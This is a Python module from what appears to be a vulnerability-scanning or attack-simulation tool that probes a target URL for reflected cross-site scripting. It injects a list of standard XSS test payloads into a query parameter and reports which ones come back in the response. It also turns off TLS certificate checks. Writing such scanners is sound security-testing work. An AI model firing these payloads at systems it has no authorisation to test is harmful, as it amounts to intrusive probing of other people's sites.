import requests
from .base import AttackModule
import urllib3
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class XSSModule(AttackModule):
    name = "Cross-Site Scripting (XSS)"
    description = "Detecta vulnerabilidades XSS (Reflected e DOM-based)"
    severity = "medium"
    
    def run(self, target: str) -> dict:
        session = requests.Session()
        session.verify = False
        headers = {'User-Agent': 'AttackSim/1.0'}
        
        # Payloads XSS variados
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "\"><script>alert('XSS')</script>",
            "'><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')>",
            "\"--><script>alert('XSS')</script>",
        ]
        
        results = []
        
        for payload in xss_payloads:
            try:
                # Injetar payload
                if '?' in target and '=' in target:
                    base, param = target.split('?', 1)
                    param_name, value = param.split('=', 1)
                    test_url = f"{base}?{param_name}={payload}"
                else:
                    test_url = f"{target}?q={payload}"
                
                response = session.get(test_url, headers=headers, timeout=10)
                content = response.text
                
                # Verificar se o payload foi refletido
                if payload in content:
                    results.append({
                        "type": "Reflected XSS",
                        "payload": payload,
                        "evidence": "Payload reflected in response",
                        "url": test_url,
                        "confidence": "high"
                    })
                    
            except Exception as e:
                continue
        
        if results:
            return {
                "success": True,
                "severity": "high" if len(results) > 2 else "medium",
                "details": f"🎯 Found {len(results)} XSS vulnerabilities!",
                "findings": results[:5],
                "remediation": "Sanitize user input. Use Content-Security-Policy header."
            }
        
        return {
            "success": False,
            "severity": "info",
            "details": "No XSS vulnerabilities detected with basic payloads"
        }
